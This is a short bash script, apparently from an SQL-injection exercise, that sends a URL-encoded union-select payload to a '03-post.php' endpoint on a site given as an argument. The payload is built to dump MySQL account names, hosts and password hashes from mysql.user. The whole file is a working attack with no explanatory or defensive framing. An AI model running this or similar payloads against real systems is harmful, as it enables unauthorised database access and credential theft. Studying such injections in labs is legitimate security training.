#!/bin/bash

declare -r site="$1"
declare -r payload="' union select concat(user, '.', host), password from mysql.user union select 1, '"

curl -i \
	"http://$site/03-post.php?firstname=$(echo $payload | jq -Rr @uri)"
echo
